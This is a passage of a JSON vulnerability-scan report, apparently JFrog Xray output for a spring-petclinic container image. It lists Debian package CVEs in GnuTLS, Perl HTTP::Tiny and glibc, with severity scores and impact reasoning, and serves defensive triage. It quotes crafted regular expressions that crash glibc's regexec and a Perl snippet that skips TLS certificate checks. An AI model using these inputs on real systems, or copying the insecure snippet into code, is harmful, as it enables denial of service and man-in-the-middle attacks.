                           "description": "A NULL pointer dereference occurs when the application dereferences a pointer that it expects to be valid, but is NULL, typically causing a crash or exit.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "12"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "6.5/CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A NULL pointer dereference flaw was found in GnuTLS. As Nettle's hash update functions internally call memcpy, providing zero-length input may cause undefined behavior. This flaw leads to a denial of service after authentication in rare circumstances.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2021-4209",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-515822",
         "severity": "Low",
         "jfrog_severity": "High",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "HTTP::Tiny before 0.083, a Perl core module since 5.13.9 and available standalone on CPAN, has an insecure default TLS configuration where users must opt in to verify certificates.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:perl-base",
         "source_id": "deb://debian:bullseye:perl-base",
         "source_comp_id": "deb://debian:bullseye:perl-base:5.32.1-4+deb11u2",
         "component_versions": {
            "id": "debian:bullseye:perl",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-31486",
                     "cwe": [
                        "CWE-295"
                     ],
                     "cwe_details": {
                        "CWE-295": {
                           "name": "Improper Certificate Validation",
                           "description": "The product does not validate, or incorrectly validates, a certificate."
                        }
                     },
                     "cvss_v3": "8.1/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "HTTP::Tiny before 0.083, a Perl core module since 5.13.9 and available standalone on CPAN, has an insecure default TLS configuration where users must opt in to verify certificates.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-515822",
            "VulnerabilityTitle": "",
            "ShortDescription": "Missing TLS check in HTTP::Tiny allows network attackers to perform man-in-the-middle attacks when performing SSL requests.",
            "FullDescription": "[HTTP::Tiny](https://metacpan.org/pod/HTTP::Tiny) is an HTTP client written in Perl and a standalone CPAN module. By default, HTTP::Tiny does not verify TLS certificates. To enable verification, the `verify_SSL=>1` flag must be specified when initializing the `HTTP::Tiny` object.\n\nThis could allow potential local-network attacker to perform a man-in-the-middle (ssl strip) attack.\nThis issue affects all packages that incorrectly use the `HTTP::Tiny` package.\n\nVulnerable code snippet -\n```\nuse HTTP::Tiny;\n\nmy $http = HTTP::Tiny->new();\nmy $response = $http->get('https://example.com');\n```",
            "Impact": 6,
            "VulnerabilityType": "Authentication bypass",
            "Resolution": "##### Development mitigations\n\nEnable the `verify_SSL` flag when initializing HTTP::Tiny -\n\n```perl\n$http = HTTP::Tiny->new(verify_SSL=>1);\n```",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "The vulnerability is exploitable by local network attackers",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.",
                  "Description": "The impact depends on the action performed by the vulnerable code.\nThis could be anything from information disclosure (through the web requests) to remote code execution (in the event the request response is used to install a package or influence the application's flow).",
                  "IsPositive": 1,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                  "Description": "A technical write-up exists.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "Exploitation only requires an attacker to perform a man-in-the-middle attack (which is extensively documented).",
                  "IsPositive": 0,
                  "InsertOrder": 1
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Fix Commit",
                  "Url": "https://github.com/chansen/p5-http-tiny/commit/77f557ef84698efeb6eed04e4a9704eaf85b741d",
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical write-up",
                  "Url": "https://blog.hackeriet.no/perl-http-tiny-insecure-tls-default-affects-cpan-modules/",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Issue discussion",
                  "Url": "https://github.com/chansen/p5-http-tiny/issues/152",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-31486",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-75786",
         "severity": "Low",
         "jfrog_severity": "Medium",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "In the GNU C Library (aka glibc or libc6) through 2.29, check_dst_limits_calc_pos_1 in posix/regexec.c has Uncontrolled Recursion, as demonstrated by '(\\227|)(\\\\1\\\\1|t1|\\\\\\2537)+' in grep.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc6",
         "source_id": "deb://debian:bullseye:libc6",
         "source_comp_id": "deb://debian:bullseye:libc6:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2018-20796",
                     "cwe": [
                        "CWE-674"
                     ],
                     "cwe_details": {
                        "CWE-674": {
                           "name": "Uncontrolled Recursion",
                           "description": "The product does not properly control the amount of recursion that takes place, consuming excessive resources, such as allocated memory or the program stack."
                        }
                     },
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "7.5/CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "In the GNU C Library (aka glibc or libc6) through 2.29, check_dst_limits_calc_pos_1 in posix/regexec.c has Uncontrolled Recursion, as demonstrated by '(\\227|)(\\\\1\\\\1|t1|\\\\\\2537)+' in grep.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:31:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-75786",
            "VulnerabilityTitle": "",
            "ShortDescription": "An uncontrolled recursion in glibc may result in a denial of service via malformed regular expression.",
            "FullDescription": "The [GNU C Library](https://www.gnu.org/software/libc/), commonly known as glibc, is the GNU Project's implementation of the C standard library.\n\nAn uncontrolled recursion vulnerability exists in glibc's regular expression parsing engine (posix/regexec.c).\n\nAn attacker can exploit this issue by invoking any tool (`grep`, `sed` etc.) or API (`regexec()`) with a crafted regular expression. This can be demonstrated by the crafted input: `(\\227|)(\\\\1\\\\1|t1|\\\\\\2537)+'`.\nThis scenario is much more likely in a local attack than a remote one.\n\nNote that in order to exploit this vulnerability, the attacker must control the regular expression **pattern** that glibc uses, unlike standard ReDoS vulnerabilities where only the input buffer needs to be controlled. The The pattern it not likely to be attacker-controlled from remote input.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker must find a remote input that propagates to the `regex` (pattern) argument of `regcomp` and then sent to `regexec`.\nThis includes controlling the pattern argument of a `grep` invocation.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "It is highly unlikely that a remote attacker will be able to control a regular expression pattern that's used by glibc",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has been disputed by the vendor",
                  "Description": "The software maintainer disputes that this is not a vulnerability because the behavior occurs only with a crafted pattern. Therefore - this issue is unlikely to get a fix.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Denial of service only, marked as unimportant by the Debian tracker",
                  "IsPositive": 1,
                  "InsertOrder": 5
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "https://lists.gnu.org/archive/html/bug-gnulib/2019-01/msg00108.html",
                  "Url": "https://lists.gnu.org/archive/html/bug-gnulib/2019-01/msg00108.html",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "https://debbugs.gnu.org/cgi/bugreport.cgi?bug=34141",
                  "Url": "https://debbugs.gnu.org/cgi/bugreport.cgi?bug=34141",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2018-20796",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-75786",
         "severity": "Low",
         "jfrog_severity": "Medium",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "In the GNU C Library (aka glibc or libc6) through 2.29, check_dst_limits_calc_pos_1 in posix/regexec.c has Uncontrolled Recursion, as demonstrated by '(\\227|)(\\\\1\\\\1|t1|\\\\\\2537)+' in grep.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc-bin",
         "source_id": "deb://debian:bullseye:libc-bin",
         "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2018-20796",
                     "cwe": [
                        "CWE-674"
                     ],
                     "cwe_details": {
                        "CWE-674": {
                           "name": "Uncontrolled Recursion",
                           "description": "The product does not properly control the amount of recursion that takes place, consuming excessive resources, such as allocated memory or the program stack."
                        }
                     },
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "7.5/CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "In the GNU C Library (aka glibc or libc6) through 2.29, check_dst_limits_calc_pos_1 in posix/regexec.c has Uncontrolled Recursion, as demonstrated by '(\\227|)(\\\\1\\\\1|t1|\\\\\\2537)+' in grep.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:31:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-75786",
            "VulnerabilityTitle": "",
            "ShortDescription": "An uncontrolled recursion in glibc may result in a denial of service via malformed regular expression.",
            "FullDescription": "The [GNU C Library](https://www.gnu.org/software/libc/), commonly known as glibc, is the GNU Project's implementation of the C standard library.\n\nAn uncontrolled recursion vulnerability exists in glibc's regular expression parsing engine (posix/regexec.c).\n\nAn attacker can exploit this issue by invoking any tool (`grep`, `sed` etc.) or API (`regexec()`) with a crafted regular expression. This can be demonstrated by the crafted input: `(\\227|)(\\\\1\\\\1|t1|\\\\\\2537)+'`.\nThis scenario is much more likely in a local attack than a remote one.\n\nNote that in order to exploit this vulnerability, the attacker must control the regular expression **pattern** that glibc uses, unlike standard ReDoS vulnerabilities where only the input buffer needs to be controlled. The The pattern it not likely to be attacker-controlled from remote input.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker must find a remote input that propagates to the `regex` (pattern) argument of `regcomp` and then sent to `regexec`.\nThis includes controlling the pattern argument of a `grep` invocation.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "It is highly unlikely that a remote attacker will be able to control a regular expression pattern that's used by glibc",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has been disputed by the vendor",
                  "Description": "The software maintainer disputes that this is not a vulnerability because the behavior occurs only with a crafted pattern. Therefore - this issue is unlikely to get a fix.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Denial of service only, marked as unimportant by the Debian tracker",
                  "IsPositive": 1,
                  "InsertOrder": 5
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "https://lists.gnu.org/archive/html/bug-gnulib/2019-01/msg00108.html",
                  "Url": "https://lists.gnu.org/archive/html/bug-gnulib/2019-01/msg00108.html",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "https://debbugs.gnu.org/cgi/bugreport.cgi?bug=34141",
                  "Url": "https://debbugs.gnu.org/cgi/bugreport.cgi?bug=34141",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2018-20796",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-75770",
         "severity": "Low",
         "jfrog_severity": "Medium",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "In the GNU C Library (aka glibc or libc6) through 2.29, check_dst_limits_calc_pos_1 in posix/regexec.c has Uncontrolled Recursion, as demonstrated by '(|)(\\\\1\\\\1)*' in grep, a different issue than CVE-2018-20796. NOTE: the software maintainer disputes that this is a vulnerability because the behavior occurs only with a crafted pattern",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc-bin",
         "source_id": "deb://debian:bullseye:libc-bin",
         "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2019-9192",
                     "cwe": [
                        "CWE-674"
                     ],
                     "cwe_details": {
                        "CWE-674": {
                           "name": "Uncontrolled Recursion",
                           "description": "The product does not properly control the amount of recursion that takes place, consuming excessive resources, such as allocated memory or the program stack."
                        }
                     },
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "7.5/CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "In the GNU C Library (aka glibc or libc6) through 2.29, check_dst_limits_calc_pos_1 in posix/regexec.c has Uncontrolled Recursion, as demonstrated by '(|)(\\\\1\\\\1)*' in grep, a different issue than CVE-2018-20796. NOTE: the software maintainer disputes that this is a vulnerability because the behavior occurs only with a crafted pattern",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:31:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-75770",
            "VulnerabilityTitle": "",
            "ShortDescription": "Uncontrolled recursion in glibc regexec leads to denial of service.",
            "FullDescription": "The [GNU C Library](https://www.gnu.org/software/libc/), commonly known as glibc, is the GNU Project's implementation of the C standard library.\n\nIn the GNU C Library (aka glibc or libc6) through 2.29, `check_dst_limits_calc_pos_1` in posix/regexec.c has Uncontrolled Recursion, as demonstrated by running grep with the pattern `(|)(\\\\1\\\\1)*`.\n\nNote that in order to exploit this vulnerability, the attacker must control the regular expression **pattern** that glibc uses, unlike standard ReDoS vulnerabilities where only the input buffer needs to be controlled. The The pattern it not likely to be attacker-controlled from remote input.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has been disputed by the vendor",
                  "Description": "The software maintainer disputes that this is not a vulnerability because the behavior occurs only with a crafted pattern. Therefore - this issue is unlikely to get a fix.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "It is highly unlikely that a remote attacker will be able to control a regular expression pattern that's used by glibc",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Denial of service only, marked as unimportant by the Debian tracker",
                  "IsPositive": 1,
                  "InsertOrder": 5
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker must find a remote input that propagates to the `regex` (pattern) argument of `regcomp` and then sent to `regexec`.\nThis includes controlling the pattern argument of a `grep` invocation.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "https://sourceware.org/bugzilla/show_bug.cgi?id=24269",
                  "Url": "https://sourceware.org/bugzilla/show_bug.cgi?id=24269",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2019-9192",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-75770",
         "severity": "Low",
         "jfrog_severity": "Medium",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "In the GNU C Library (aka glibc or libc6) through 2.29, check_dst_limits_calc_pos_1 in posix/regexec.c has Uncontrolled Recursion, as demonstrated by '(|)(\\\\1\\\\1)*' in grep, a different issue than CVE-2018-20796. NOTE: the software maintainer disputes that this is a vulnerability because the behavior occurs only with a crafted pattern",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc6",
         "source_id": "deb://debian:bullseye:libc6",
         "source_comp_id": "deb://debian:bullseye:libc6:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2019-9192",
                     "cwe": [
                        "CWE-674"
                     ],
                     "cwe_details": {
                        "CWE-674": {
                           "name": "Uncontrolled Recursion",
                           "description": "The product does not properly control the amount of recursion that takes place, consuming excessive resources, such as allocated memory or the program stack."
                        }
                     },
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "7.5/CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "In the GNU C Library (aka glibc or libc6) through 2.29, check_dst_limits_calc_pos_1 in posix/regexec.c has Uncontrolled Recursion, as demonstrated by '(|)(\\\\1\\\\1)*' in grep, a different issue than CVE-2018-20796. NOTE: the software maintainer disputes that this is a vulnerability because the behavior occurs only with a crafted pattern",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:31:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-75770",
            "VulnerabilityTitle": "",
            "ShortDescription": "Uncontrolled recursion in glibc regexec leads to denial of service.",
            "FullDescription": "The [GNU C Library](https://www.gnu.org/software/libc/), commonly known as glibc, is the GNU Project's implementation of the C standard library.\n\nIn the GNU C Library (aka glibc or libc6) through 2.29, `check_dst_limits_calc_pos_1` in posix/regexec.c has Uncontrolled Recursion, as demonstrated by running grep with the pattern `(|)(\\\\1\\\\1)*`.\n\nNote that in order to exploit this vulnerability, the attacker must control the regular expression **pattern** that glibc uses, unlike standard ReDoS vulnerabilities where only the input buffer needs to be controlled. The The pattern it not likely to be attacker-controlled from remote input.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has been disputed by the vendor",
                  "Description": "The software maintainer disputes that this is not a vulnerability because the behavior occurs only with a crafted pattern. Therefore - this issue is unlikely to get a fix.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "It is highly unlikely that a remote attacker will be able to control a regular expression pattern that's used by glibc",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Denial of service only, marked as unimportant by the Debian tracker",
                  "IsPositive": 1,
                  "InsertOrder": 5
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker must find a remote input that propagates to the `regex` (pattern) argument of `regcomp` and then sent to `regexec`.\nThis includes controlling the pattern argument of a `grep` invocation.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "https://sourceware.org/bugzilla/show_bug.cgi?id=24269",
                  "Url": "https://sourceware.org/bugzilla/show_bug.cgi?id=24269",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2019-9192",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-33571",
         "severity": "Low",
         "jfrog_severity": "Medium",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "The glob implementation in the GNU C Library (aka glibc or libc6) allows remote authenticated users to cause a denial of service (CPU and memory consumption) via crafted glob expressions that do not match any pathnames, as demonstrated by glob expressions in STAT commands to an FTP daemon, a different vulnerability than CVE-2010-2632.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc6",
         "source_id": "deb://debian:bullseye:libc6",
         "source_comp_id": "deb://debian:bullseye:libc6:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2010-4756",
                     "cwe": [
                        "CWE-399"
                     ],
                     "cvss_v2": "4.0/CVSS:2.0/AV:N/AC:L/Au:S/C:N/I:N/A:P"
                  }
               ],
               "description": "The glob implementation in the GNU C Library (aka glibc or libc6) allows remote authenticated users to cause a denial of service (CPU and memory consumption) via crafted glob expressions that do not match any pathnames, as demonstrated by glob expressions in STAT commands to an FTP daemon, a different vulnerability than CVE-2010-2632.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:30:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-33571",
            "VulnerabilityTitle": "",
            "ShortDescription": "An unbounded computation in glibc leads to denial of service when parsing crafted glob expressions.",
            "FullDescription": "The GNU C Library project provides the core libraries for the GNU system and GNU/Linux systems, as well as many other systems that use Linux as the kernel. One of the provided functions is `glob`. *This function expands a filename wildcard which is passed as pattern*. It usually implements a limitation though the `GLOB_LIMIT` constant but a flaw is causing a `denial of service when the crafted glob expression does not match any pathnames`.\nThis vulnerability is very similar to the one affecting the *STAT* commands against an FTP Deamon which gives information about the file and the filesystem, also vulnerable to glob expression causing the process to use 100% of the CPU capabilities for a long time.\nHowever, this vulnerability needs the attacker to be an authenticated user.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has been disputed by the vendor",
                  "Description": "The software maintainer disputes that this is not a vulnerability because the behavior occurs only with a crafted glob pattern. Therefore - this issue is unlikely to get a fix.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Marked as unimportant by the Debian tracker. Computation-based DoS.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker must find a remote input that propagates into the `pattern` argument of a `glob` call.\nHowever, as the technical [write-up](https://cxsecurity.com/issue/WLB-2010100135) shows, this vulnerability can be remotely exploited in some common cases, such as FTP servers.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                  "Description": "A technical [write-up](https://cxsecurity.com/issue/WLB-2010100135) was published explaining the bug and how to trigger it.",
                  "IsPositive": 0,
                  "InsertOrder": 5
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "It is unlikely that a remote attacker will be able to control a glob pattern from a remote input",
                  "IsPositive": 1,
                  "InsertOrder": 1
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Information on how to exploit this bug is given in this link",
                  "Url": "https://cxsecurity.com/issue/WLB-2010100135",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://cxsecurity.com/issue/WLB-2010100135",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2010-4756",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-33571",
         "severity": "Low",
         "jfrog_severity": "Medium",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "The glob implementation in the GNU C Library (aka glibc or libc6) allows remote authenticated users to cause a denial of service (CPU and memory consumption) via crafted glob expressions that do not match any pathnames, as demonstrated by glob expressions in STAT commands to an FTP daemon, a different vulnerability than CVE-2010-2632.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc-bin",
         "source_id": "deb://debian:bullseye:libc-bin",
         "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
